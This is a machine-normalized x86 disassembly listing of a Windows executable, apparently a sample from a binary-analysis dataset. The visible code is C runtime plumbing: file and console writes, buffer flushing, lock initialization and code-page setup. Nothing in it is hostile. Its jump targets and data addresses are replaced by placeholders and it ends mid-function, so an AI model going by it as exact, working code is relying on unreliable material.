push 0x3
call sub_408161
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_4080fe
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_405310
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_402d2f
push esi
call sub_4080e3
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_4080fe
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_407fa1
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_4080e3
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_408016
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_407fa1
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_407e35
add esp 0xc
jmp r-xdata
sub_403810
push 0x3
call sub_408161
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_403661
push 0xff
call sub_403661
pop ecx
pop ecx
push 0x3
call sub_408161
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_403858
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_403880
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_408320
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_402de6
mov [ eax ] edi
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4020cb
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
jmp r-xdata
push esi
call sub_40760b
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_407453
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_404f0c
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_402dd3
mov [ eax ] 0x1c
call sub_402de6
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_402df9
pop ecx
jmp r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_405739
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_4081a0
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_4082f8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_4082f8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_4081a0
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_403f7d
push 0x10
push r--data
call sub_402ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40843a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402de6
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_403880
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404049
mov eax [ ebp - 0x1c ]
sub_404051
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
pop ebp
retn
sub_404077
push 0x10
push r--data
call sub_402ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_402dd3
mov [ eax ] 0x9
call sub_402dd3
mov [ eax ] 0x9
call sub_402d81
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40843a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_4083d1
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404148
mov eax [ ebp - 0x1c ]
call sub_402de6
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_404150
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_404208
push 0xc
push r--data
call sub_402ff0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_403810
push 0x1e
call sub_403661
push 0xff
call sub_40337b
push 0x18
call sub_40522f
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_402dd3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_403035
retn
push edi
call sub_4020da
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4020da
pop ecx
call sub_402dd3
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4042c1
mov eax [ ebp - 0x1c ]
sub_4042ca
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_404208
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40361d
sub_4042fd
call sub_407c76
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_407c83
pop ecx
push 0x3
call sub_4035e9
int3
push 0x1
push 0x40000015
push 0x3
call sub_402c06
add esp 0xc
sub_40433f
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40436e
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_405780
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_4043d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_408814
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_4086e7
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_4086e7
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_405780
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_404562
push 0xc
push r--data
call sub_402ff0
call sub_404f0c
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4045fd
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_403035
retn
push 0x20
call sub_40361d
cmp esi rw-data
je r-xdata
push esi
call sub_4020da
pop ecx
sub_404606
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40233b
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_404682
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_404606
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40436e
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_405780
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4020cb
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40433f
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_4043d2
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_405780
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40433f
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40486b
push 0x14
push r--data
call sub_402ff0
or [ ebp - 0x20 ] 0xffffffff
call sub_404f0c
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_404562
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_404606
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40522f
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_403035
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_404682
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_402dd3
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_4020da
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_4020da
pop ecx
push 0xd
call sub_4042ca
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
